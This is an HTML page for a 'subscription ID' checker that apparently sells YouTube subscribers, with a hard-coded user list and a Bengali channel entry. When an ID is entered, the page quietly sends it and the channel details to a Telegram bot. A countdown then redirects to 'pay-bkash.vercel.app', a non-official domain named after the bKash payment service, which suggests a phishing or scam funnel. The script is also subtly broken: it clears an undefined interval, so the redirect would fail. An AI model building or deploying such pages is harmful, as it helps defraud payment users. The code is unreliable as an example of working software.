<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SUBSCRIPTION EXE</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #FF5F6D, #FFC371);
            color: #fff;
            text-align: center;
            padding: 50px;
        }

        .logo {
            display: block;
            margin: 0 auto 20px auto;
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 3px solid white;
        }

        h2 {
            color: #fff;
            font-size: 1.5em;
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
            margin-bottom: 20px;
            background: linear-gradient(90deg, red, orange, yellow, green, blue, indigo, violet);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: rainbowText 7s linear infinite;
        }

        @keyframes rainbowText {
            0% { background-position: 0% }
            100% { background-position: 100% }
        }

        .input-container {
            position: relative;
            margin-bottom: 20px;
            display: inline-block;
            border: 2px solid #fff;
            border-radius: 5px;
            padding: 5px;
            background-color: rgba(255, 255, 255, 0.2);
            transition: background-color 0.3s;
        }

        input[type="text"] {
            padding: 10px;
            width: 300px;
            border: none;
            border-radius: 5px;
            font-size: 1.1em;
            color: #333;
            background-color: #f9f9f9;
            letter-spacing: 0.17em;
            font-family: 'Courier New', Courier, monospace;
            -webkit-text-security: disc;
        }

        input[type="submit"] {
            background-color: black;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 5px;
            font-size: 1.2em;
            cursor: pointer;
            transition: background-color 0.3s ease;
            animation: flicker 1s infinite;
        }

        @keyframes flicker {
            0%, 100% { background-color: black; color: white; }
            50% { background-color: white; color: black; }
        }

        .info {
            margin-top: 30px;
            padding: 20px;
            background-color: gray;
            border-radius: 10px;
            box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
            display: none;
            color: #333;
        }

        .info img {
            width: 70px;
            height: 70px;
            display: block;
            margin: 0 auto 10px auto;
        }

        #channelName {
            font-weight: bold;
            font-size: 1.5em;
            color: white;
        }

        #channel {
            font-weight: bold;
            font-size: 1.2em;
            background: linear-gradient(90deg, red, green, blue);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: rgbAnimation 3s infinite;
        }

        #quantity {
            font-weight: bold;
            color: white;
        }

        #countdown {
            margin-top: 20px;
            font-size: 1.5em;
            color: #FFEB3B;
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
            display: none;
        }

        .countdown-ball {
            display: inline-block;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background-color: black;
            color: white;
            font-weight: bold;
            line-height: 30px;
            margin: 0 5px;
            animation: ballFlicker 1s infinite;
        }

        @keyframes ballFlicker {
            0%, 100% { background-color: black; color: white; }
            50% { background-color: white; color: black; }
        }

        @media (max-width: 600px) {
            input[type="text"] {
                width: 90%;
            }

            h2 {
                font-size: 1.2em;
            }

            input[type="submit"] {
                font-size: 1em;
            }
        }
    </style>
</head>
<body>

<img src="https://imgur.com/bODPbe8.png" alt="Logo" class="logo">
 
<h2>SUBSCRIPTION EXE<br>REPLIT PROJECT</h2>

<div class="input-container">
    <input type="text" id="username" placeholder="SUBSCRIPTION ID"><br>
</div>
<input type="submit" value="CONFIRM" onclick="checkUsername()">

<div class="info" id="info">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube Logo">
    <img id="channelLogo" src="" alt="Channel Logo" class="channel-logo" style="display:none; border-radius: 50%;">
    <h2 style="font-size: 1.2em; color: #FFEB3B;">Channel Information</h2>
    <p id="channelName">Channel Name: <span id="channel"></span></p>
    <p id="quantity">Quantity: <span id="qty" style="font-weight: bold;"></span></p>
</div> 

<div id="countdown"></div>

<script>
    const botToken = "YOUR_BOT_TOKEN";
    const chatId = "YOUR_CHAT_ID";

    const database = [
        { username: "main5main5", channelName: "নতুন সব অনলাইন গেমের তথ্য ", quantity: 2000, logo: "https://imgur.com/qnwzXgr.png" },
        // Add more users here...
    ];

    function checkUsername() {
        const username = document.getElementById("username").value;
        const user = database.find(user => user.username === username);

        if (user) {
            document.getElementById("channel").innerText = user.channelName;
            document.getElementById("qty").innerText = user.quantity;
            document.getElementById("channelLogo").src = user.logo;
            document.getElementById("channelLogo").style.display = 'block';
            document.getElementById("info").style.display = 'block';
            startCountdown(10);
            document.getElementById("username").style.display ='none';

            sendTelegramMessage(username, user.channelName, user.quantity);
        } else {
            alert("Invalid Subscription ID.");
        }
    }

    function sendTelegramMessage(username, channelName, quantity) {
        const message = `User: ${username}\nChannel Name: ${channelName}\nQuantity: ${quantity}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
        
        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Message sent to Telegram successfully.');
                } else {
                    console.error('Failed to send message to Telegram.');
                }
            })
            .catch(error => console.error('Error:', error));
    }

    function startCountdown(seconds) {
        const countdownElement = document.getElementById("countdown");
        countdownElement.style.display = 'block';

        function updateCountdown() {
            countdownElement.innerHTML = `Starting in <span class="countdown-ball">${seconds}</span> seconds`;
            seconds--;
            
            if (seconds < 0) {
                clearInterval(countdownInterval);
                window.location.href = "https://pay-bkash.vercel.app";
            } else {
                setTimeout(updateCountdown, 1000);
                }
        }
        updateCountdown();
    }
</script>

</body>
</html>
